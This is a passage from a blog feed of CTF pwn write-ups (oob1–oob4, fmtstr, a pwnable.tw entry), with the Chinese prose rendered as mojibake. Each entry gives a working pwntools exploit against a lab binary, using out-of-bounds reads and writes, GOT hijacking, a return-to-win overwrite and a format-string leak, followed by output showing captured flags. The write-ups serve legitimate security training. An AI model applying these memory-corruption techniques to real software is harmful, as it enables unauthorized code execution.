href="https://b1n.io/posts/pwnable.tw-start/" >https://b1n.io/posts/pwnable.tw-start/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/weixin_43483799/article/details/113844032" >https://blog.csdn.net/weixin_43483799/article/details/113844032 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>shellcode çš„éƒ¨åˆ†å¯ä»¥é¸æ“‡ç›´æ¥æ‰‹åˆ»ï¼Œæˆ–æ˜¯åƒè€ƒä¸‹é¢é€™å€‹ç¶²ç«™ä¹Ÿå¯ä»¥ï¼š<br><a class="link"   href="https://www.exploit-db.com/search?type=shellcode&platform=linux_x86" >https://www.exploit-db.com/search?type=shellcode&amp;platform=linux_x86 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-start&quot;&gt;&lt;a href=&quot;#Pwnable-tw-start&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - start&quot;&gt;&lt;/a&gt;Pwnable.tw - start&lt;/h1&gt;&lt;h3 id=&quot;Descr</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="ret2sc" scheme="https://kazma.tw/tags/ret2sc/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob4 Writeup</title>
    <link href="https://kazma.tw/2024/02/06/Pwnctf-oob4-Writeup/"/>
    <id>https://kazma.tw/2024/02/06/Pwnctf-oob4-Writeup/</id>
    <published>2024-02-05T18:50:53.000Z</published>
    <updated>2024-02-05T19:19:17.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob4"><a href="#oob4" class="headerlink" title="oob4"></a>oob4</h1><p>é€™é¡ŒåŸ·è¡Œèµ·ä¾†è·Ÿ oob2, oob3 ä¸€æ¨£ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œä½†è·Ÿ oob3 ä¸åŒçš„æ˜¯ä»–é€™æ¬¡æŠŠè®Šæ•¸éƒ½å®£å‘Šåœ¨ main è£¡é¢æ‰€ä»¥ offset æœƒä¸å¤ªä¸€æ¨£ï¼Œä½†ä¸€æ¨£æ˜¯è¦ oob write ç„¶å¾Œ ret2winï¼Œæˆ‘æŠŠ stack æ•´ç†åœ¨ä¸‹é¢ä¾†è§£é‡‹ offset æ˜¯æ€éº¼ç®—çš„ï¼š</p><p>åŸ·è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./oob3</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>stack:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rbp-0x5c <span class="comment"># input_id (rsp)</span></span><br><span class="line">rbp-0x58 <span class="comment"># input_pw</span></span><br><span class="line">rbp-0x54 <span class="comment"># index</span></span><br><span class="line">rbp-0x50 <span class="comment"># admin pw </span></span><br><span class="line">rbp-0x4c <span class="comment"># alice pw</span></span><br><span class="line">rbp-0x48 <span class="comment"># bob pw</span></span><br><span class="line">rbp-0x44 <span class="comment"># guest pw</span></span><br><span class="line">rbp-0x40 <span class="comment"># admin string</span></span><br><span class="line">rbp-0x38 <span class="comment"># alice string</span></span><br><span class="line">rbp-0x30 <span class="comment"># bob string</span></span><br><span class="line">rbp-0x28 <span class="comment"># guest</span></span><br><span class="line">rbp-0x18 <span class="comment"># canary</span></span><br><span class="line">rbp-0x10</span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œé™„ä¸Šè¼¸å…¥ Nickname çš„ fgetsï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob4_r2.png"                      alt="r2"                ><br>å› ç‚ºåœ¨ call å®Œ fgets ä¹‹å¾Œæœƒ ret å› mainï¼Œæ‰€ä»¥å¯ä»¥æŠŠ win å¯«åœ¨ rsp - 8 çš„ä½ç½®ï¼Œoffset æ˜¯ï¼š<br><code>(0x40 - 0x5c - 0x8) / 8 = -5</code></p><p>exploit å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x4007e6</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-5&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, p64(win))</span><br><span class="line">r.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob4&#x27;</span>: pid 66498</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> BreakALLCTF&#123;EpKa0zXqkYldHXKknjqB&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob4&quot;&gt;&lt;a href=&quot;#oob4&quot; class=&quot;headerlink&quot; title=&quot;oob4&quot;&gt;&lt;/a&gt;oob4&lt;/h1&gt;&lt;p&gt;é€™é¡ŒåŸ·è¡Œèµ·ä¾†è·Ÿ oob2, oob3 ä¸€æ¨£ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œä½†è·Ÿ oob3 ä¸åŒçš„æ˜¯ä»–é€™æ¬¡æŠŠè®Šæ•¸éƒ½å®£å‘Šåœ¨ main è£¡é¢æ‰€ä»¥ o</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob3 Writeup</title>
    <link href="https://kazma.tw/2024/02/05/Pwnctf-oob3-Writeup/"/>
    <id>https://kazma.tw/2024/02/05/Pwnctf-oob3-Writeup/</id>
    <published>2024-02-04T17:35:21.000Z</published>
    <updated>2024-02-04T18:00:47.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob3"><a href="#oob3" class="headerlink" title="oob3"></a>oob3</h1><p>é€™é¡ŒåŸ·è¡Œèµ·ä¾†è·Ÿ oob2 ä¸€æ¨£ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œä½†æ˜¯é€†å‘çœ‹æœƒç™¼ç¾ç”¨ admin ç™»å…¥ä¹‹å¾Œä»–ä¸æœƒå¹«æˆ‘å€‘é–‹ shellï¼Œä½†æ˜¯æœ‰ win å¯ä»¥é–‹ shellï¼Œæ‰€ä»¥é€™é¡Œå…¶å¯¦å°±æ˜¯ oob write çš„ ret2winï¼Œé€™è£¡é¸æ“‡çš„åšæ³•æ˜¯ Got Hijackingï¼Œéš¨ä¾¿é¸ä¸€å€‹ fgets ä¹‹å¾Œå‡ºç¾çš„å‡½å¼éƒ½å¯ä»¥ã€‚</p><p>åŸ·è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./oob3</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>exploit å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./oob3&quot;</span>)</span><br><span class="line">win = <span class="number">0x400924</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;-17&quot;</span>) <span class="comment">#0x601038 &lt;strcspn@GLIBC_2.2.5&gt;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, p64(win))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;cat f*&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob3&#x27;</span>: pid 3521008</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> BreakALLCTF&#123;Dmq1Qe1QYOhxae8KhxVc&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob3&quot;&gt;&lt;a href=&quot;#oob3&quot; class=&quot;headerlink&quot; title=&quot;oob3&quot;&gt;&lt;/a&gt;oob3&lt;/h1&gt;&lt;p&gt;é€™é¡ŒåŸ·è¡Œèµ·ä¾†è·Ÿ oob2 ä¸€æ¨£ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œä½†æ˜¯é€†å‘çœ‹æœƒç™¼ç¾ç”¨ admin ç™»å…¥ä¹‹å¾Œä»–ä¸æœƒå¹«æˆ‘å€‘é–‹ shellï¼Œä½†æ˜¯æœ‰ wi</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob2 Writeup</title>
    <link href="https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/"/>
    <id>https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/</id>
    <published>2024-01-18T16:05:09.000Z</published>
    <updated>2024-01-18T16:18:50.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob2"><a href="#oob2" class="headerlink" title="oob2"></a>oob2</h1><p>é€™é¡Œè·Ÿ oob1 æ˜¯é¡ä¼¼çš„ï¼ŒåŸ·è¡Œå¾Œå¯ä»¥è§€å¯Ÿåˆ°é€™æ¬¡å¤šäº†ä¸€å€‹åŠŸèƒ½æ˜¯å¯ä»¥è®“ä½¿ç”¨è€…è¨­å®šè‡ªå·±çš„ nickname ç„¶å¾Œç™»å…¥çš„æ™‚å€™å°±æœƒé¡¯ç¤ºä½ è‡ªå·±è¨­å®šçš„é€™å€‹æš±ç¨±ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./oob2</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div><p>é‚£è·Ÿä¸Šä¸€é¡ŒåŸºæœ¬ä¸Šè§£æ³•ä¸€æ¨£ï¼Œæˆ‘å€‘åŸæœ¬æ˜¯ oob read admin çš„ pincode é‚£ç¾åœ¨è®Šæˆæ˜¯ oob write admin çš„ pincodeï¼Œexploit å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;-4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p32(<span class="number">1</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;kazma&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob2&#x27;</span>: pid 14326</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging as [kazma] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;DJPD61GTBQIqqL7sWEvF&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob2&quot;&gt;&lt;a href=&quot;#oob2&quot; class=&quot;headerlink&quot; title=&quot;oob2&quot;&gt;&lt;/a&gt;oob2&lt;/h1&gt;&lt;p&gt;é€™é¡Œè·Ÿ oob1 æ˜¯é¡ä¼¼çš„ï¼ŒåŸ·è¡Œå¾Œå¯ä»¥è§€å¯Ÿåˆ°é€™æ¬¡å¤šäº†ä¸€å€‹åŠŸèƒ½æ˜¯å¯ä»¥è®“ä½¿ç”¨è€…è¨­å®šè‡ªå·±çš„ nickname ç„¶å¾Œç™»å…¥çš„æ™‚å€™å°±æœƒé¡¯</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf oob1 Writeup</title>
    <link href="https://kazma.tw/2024/01/17/Pwnctf-oob1-Writeup/"/>
    <id>https://kazma.tw/2024/01/17/Pwnctf-oob1-Writeup/</id>
    <published>2024-01-16T17:04:53.000Z</published>
    <updated>2024-01-16T18:09:04.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="oob1"><a href="#oob1" class="headerlink" title="oob1"></a>oob1</h1><p>åŸ·è¡Œå¾Œå¯ä»¥è§€å¯Ÿåˆ°é€™é¡Œçš„æƒ…å¢ƒæ˜¯ä¸€å€‹ç™»å…¥ç³»çµ±ï¼Œé¦–å…ˆæœƒè®“æˆ‘å€‘è¼¸å…¥ User IDï¼Œç„¶å¾Œè¼¸å…¥å¯†ç¢¼ï¼Œå†ä¾†æœƒé¡¯ç¤ºæˆ‘å€‘å˜—è©¦ç™»å…¥çš„ä½¿ç”¨è€…åç¨±ï¼Œæœ€å¾Œè¼¸å‡ºçµæœï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./oob1</span><br><span class="line">User ID: 3</span><br><span class="line">PIN: 1324</span><br><span class="line">Logging to [guest] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br><span class="line"></span><br><span class="line">User ID: 0</span><br><span class="line">PIN: 0000</span><br><span class="line">Logging to [admin] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br><span class="line"></span><br><span class="line">User ID: 5</span><br><span class="line">non-existed ID!</span><br></pre></td></tr></table></figure></div><p>é€™é¡Œçš„é—œéµæ˜¯åœ¨è®€å– User ID æ™‚æ²’æœ‰åšæª¢æŸ¥ï¼Œåˆä»–æœƒé¡¯ç¤ºæˆ‘å€‘æ­£åœ¨å˜—è©¦ç™»å…¥çš„ä½¿ç”¨è€…ï¼Œå› æ­¤å¯ä»¥é€é oob read å»è®€å–åˆ° admin çš„ä¸€é–‹å§‹è¨­å®šçš„éš¨æ©Ÿå¯†ç¢¼ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob1_key.png"                      alt="key"                ></p><p>å¾ä¸Šé¢å¯ä»¥çœ‹åˆ° obj.user çš„ä½ç½®åœ¨ 0x6010c0ï¼Œé‚£æˆ‘å€‘æ¥ä¸‹ä¾†å°±æ‰¾ admin çš„å¯†ç¢¼æ”¾åœ¨å“ªå€‹ä½ç½®ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/oob1_pass.png"                      alt="pass"                ></p><p>å¾ä¸Šé¢å¯ä»¥æ‰¾åˆ° obj.pincode åœ¨ 0x6010a0ï¼Œè·Ÿ obj.user å·® 0x20ï¼ŒåˆåŸæœ¬çš„åŠŸèƒ½æ˜¯è¦å–å…¶ä»– username æ‰€ä»¥ rax æœƒå·¦ç§»ä¸‰å€‹ bitsï¼Œä¹Ÿå°±æ˜¯ä¹˜ä»¥ 8ï¼Œæ•… User ID è¼¸å…¥ -4 å¯ä»¥ oob read æˆ‘å€‘æƒ³è¦çš„æ±è¥¿ï¼Œç„¶å¾Œ information leak å®Œä¹‹å¾Œå†æŠŠçµæœåƒå›ä¾†æ•´ç†ä¸€ä¸‹ï¼Œç™»å…¥ admin å³å¯èµ°åˆ° win funcï¼Œexploit å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./oob1&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1234&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">pin = u32(r.recvuntil(<span class="string">&quot;]&quot;</span>)[:-<span class="number">1</span>][:<span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pin: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob1&#x27;</span>: pid 2841934</span><br><span class="line">pin: 151386595</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging to [admin] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;CPuPeMrhVrWWx2XueaIr&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oob1&quot;&gt;&lt;a href=&quot;#oob1&quot; class=&quot;headerlink&quot; title=&quot;oob1&quot;&gt;&lt;/a&gt;oob1&lt;/h1&gt;&lt;p&gt;åŸ·è¡Œå¾Œå¯ä»¥è§€å¯Ÿåˆ°é€™é¡Œçš„æƒ…å¢ƒæ˜¯ä¸€å€‹ç™»å…¥ç³»çµ±ï¼Œé¦–å…ˆæœƒè®“æˆ‘å€‘è¼¸å…¥ User IDï¼Œç„¶å¾Œè¼¸å…¥å¯†ç¢¼ï¼Œå†ä¾†æœƒé¡¯ç¤ºæˆ‘å€‘å˜—è©¦ç™»å…¥çš„ä½¿ç”¨è€…åç¨±</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf fmtstr Writeup</title>
    <link href="https://kazma.tw/2024/01/10/Pwnctf-fmtstr-Writeup/"/>
    <id>https://kazma.tw/2024/01/10/Pwnctf-fmtstr-Writeup/</id>
    <published>2024-01-09T17:21:15.000Z</published>
    <updated>2024-01-09T17:49:51.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h1><p>é€™é¡Œåœ¨è€ƒçš„æ˜¯ format stringï¼Œå¯ä»¥å¾ gdb çœ‹åˆ° flag åœ¨ stack è£¡çš„ä½ç½®å¦‚ä¸‹ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/fmtstr_stack.png"                      alt="stack"                ></p><p>$rsp çš„ä½ç½®æ˜¯ 6ï¼Œæ¨ç®—å¯ä»¥å¾—çŸ¥ flag åœ¨ 12 ~ 18 çš„ä½ç½®ï¼Œæœ€å¾Œå°å‡ºä¾†å¾Œå†èª¿æ•´ä¸€ä¸‹ little endian çš„æ ¼å¼ï¼Œexploit.py å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fmtstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">19</span>):</span><br><span class="line">    p += <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">p += <span class="string">&#x27;#&#x27;</span></span><br><span class="line"><span class="comment">#print(p)</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">s = r.recvuntil(<span class="string">b&#x27;#&#x27;</span>).strip(<span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s.split(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> ss == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)//<span class="number">2</span>):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(ss[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fmtstr&quot;&gt;&lt;a href=&quot;#fmtstr&quot; class=&quot;headerlink&quot; title=&quot;fmtstr&quot;&gt;&lt;/a&gt;fmtstr&lt;/h1&gt;&lt;p&gt;é€™é¡Œåœ¨è€ƒçš„æ˜¯ format stringï¼Œå¯ä»¥å¾ gdb çœ‹åˆ° flag åœ¨ stack è£¡çš„ä½ç½®å¦‚ä¸‹ï¼š&lt;/</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf secret Writeup</title>
